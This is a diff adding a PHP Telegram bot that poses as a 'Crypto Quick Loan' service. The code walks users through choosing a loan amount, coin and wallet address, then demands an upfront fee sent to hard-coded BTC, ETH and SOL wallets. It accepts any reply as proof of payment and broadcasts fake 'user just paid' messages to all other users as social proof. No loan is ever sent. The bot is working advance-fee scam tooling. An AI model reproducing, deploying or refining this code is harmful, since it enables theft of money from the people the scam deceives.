@@ -1,0 +1,119 @@
+<?php
+$botToken = getenv('BOT_TOKEN') ?: "YOUR_BOT_TOKEN";
+$website = "https://api.telegram.org/bot$botToken";
+$update = json_decode(file_get_contents("php://input"), TRUE);
+
+if (!is_array($update)) {
+    http_response_code(400);
+    exit;
+}
+
+// Telegram sends many update kinds (callback_query, edited_message, ...).
+// Only plain messages carry a chat and text, so ignore anything else.
+if (!isset($update["message"]["chat"]["id"]) || !isset($update["message"]["text"])) {
+    http_response_code(200);
+    exit;
+}
+
+$chatId = $update["message"]["chat"]["id"];
+$message = trim($update["message"]["text"]);
+
+$btc_wallet = "bc1qw7q639z27yh6x5q2d5dxe7320xd3ljfmxf60m8";
+$eth_wallet = "0xeaf5a6b7d91754534ec88a884297e5a2c05fcc11";
+$sol_wallet = "Ak2Y9u6Y8YpNaP7jEjPPXytGQK6npqaKu9uN8WAbkyRr";
+
+$wallets = ["BTC" => $btc_wallet, "ETH" => $eth_wallet, "SOL" => $sol_wallet];
+$fees = ["$100" => "$10", "$500" => "$15", "$1000" => "$25", "$5000" => "$100", "$10000" => "$165"];
+
+$userFile = getenv('STATE_FILE') ?: (__DIR__ . '/users.json');
+$users = [];
+if (is_readable($userFile)) {
+    $decoded = json_decode(file_get_contents($userFile), true);
+    if (is_array($decoded)) $users = $decoded;
+}
+
+function saveUsers(string $userFile, array $users): bool
+{
+    $json = json_encode($users);
+    if ($json === false) return false;
+    // Write to a temp file and rename so a crash mid-write cannot corrupt the store.
+    $tmp = $userFile . '.tmp';
+    if (file_put_contents($tmp, $json, LOCK_EX) === false) return false;
+    if (!rename($tmp, $userFile)) {
+        unlink($tmp);
+        return false;
+    }
+    @chmod($userFile, 0664);
+    return true;
+}
+
+if (!isset($users[$chatId])) {
+    $users[$chatId] = ["step" => 0];
+    saveUsers($userFile, $users);
+}
+
+function sendMessage($chatId, $text, $keyboard = null) {
+    global $website;
+    $url = $website . "/sendMessage";
+    $post = ["chat_id" => $chatId, "text" => $text, "parse_mode" => "HTML"];
+    if ($keyboard) $post["reply_markup"] = json_encode(["keyboard" => $keyboard, "resize_keyboard" => true]);
+    $result = @file_get_contents($url . "?" . http_build_query($post));
+    if ($result === false) {
+        error_log("Telegram sendMessage failed for chat $chatId");
+    }
+}
+
+if ($message == "/start") {
+    sendMessage($chatId, "💰 Welcome to Crypto Quick Loan Bot!\nChoose your loan amount:", [["$100", "$500"], ["$1000", "$5000"], ["$10000"]]);
+    $users[$chatId]["step"] = "choose_amount";
+    saveUsers($userFile, $users);
+    return;
+}
+
+switch ($users[$chatId]["step"]) {
+    case "choose_amount":
+        if (!isset($fees[$message])) {
+            sendMessage($chatId, "⚠️ Please choose a valid loan amount.\nAvailable: " . implode(", ", array_keys($fees)));
+            break;
+        }
+        $users[$chatId]["amount"] = $message;
+        sendMessage($chatId, "💱 Choose your preferred cryptocurrency:", [["BTC", "ETH", "SOL"]]);
+        $users[$chatId]["step"] = "choose_coin";
+        break;
+
+    case "choose_coin":
+        if (!isset($wallets[$message])) {
+            sendMessage($chatId, "⚠️ Unsupported cryptocurrency: $message\nChoose one of: " . implode(", ", array_keys($wallets)));
+            break;
+        }
+        $users[$chatId]["coin"] = $message;
+        sendMessage($chatId, "🔑 Enter your $message wallet address:");
+        $users[$chatId]["step"] = "get_wallet";
+        break;
+
+    case "get_wallet":
+        if (!preg_match('/^[a-zA-Z0-9]{20,120}$/', $message)) {
+            $chosenCoin = $users[$chatId]["coin"];
+            sendMessage($chatId, "⚠️ That doesn't look like a valid wallet address.\nPlease send a valid $chosenCoin address.");
+            break;
+        }
+        $users[$chatId]["wallet"] = $message;
+        $fee = $fees[$users[$chatId]["amount"]];
+        $coin = $users[$chatId]["coin"];
+        $pay_to = $wallets[$coin];
+        sendMessage($chatId, "💸 To process your {$users[$chatId]["amount"]} loan, send a fee of $fee in $coin to:\n\n<code>$pay_to</code>\n\nAfter payment, send your payment screenshot or TXID.");
+        $users[$chatId]["fee"] = $fee;
+        $users[$chatId]["step"] = "await_payment";
+        break;
+
+    case "await_payment":
+        sendMessage($chatId, "✅ Your payment proof has been received.\nYour loan is now being processed and will be sent within 24 hours.");
+        $popup = "💡 User " . substr($chatId, -4) . " just paid {$users[$chatId]["fee"]} for a {$users[$chatId]["amount"]} loan!";
+        foreach ($users as $id => $info) {
+            if ($id != $chatId) sendMessage($id, $popup);
+        }
+        $users[$chatId]["step"] = "done";
+        break;
+}
+
+saveUsers($userFile, $users);
